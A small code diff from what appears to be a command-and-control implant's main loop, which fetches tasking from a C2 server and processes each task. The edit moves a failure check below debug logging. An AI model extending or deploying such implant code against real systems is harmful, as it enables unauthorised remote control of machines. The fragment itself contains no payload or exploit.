@@ -175,10 +175,6 @@ void go() {
 		TaskingReply tasking_reply = { 0 };
 		BOOL task_result = perform_tasking(&state, &tasking_reply);
 		
-		if (task_result == FALSE) {
-			continue;
-		}
-		
 		#ifdef CELEBI_DEBUG
 		if (task_result == TRUE) {
 			dprintf("Received tasking from C2 server!");
@@ -186,6 +182,10 @@ void go() {
 			dprintf("Failed to get tasking from C2 server.");
 		}
 		#endif
+		
+		if (task_result == FALSE) {
+			continue;
+		}
 		
 		for (int i = 0; i < tasking_reply.tasking_size; i++) {
 			process_task(&tasking_reply.tasks[i], &state, &capabilities);
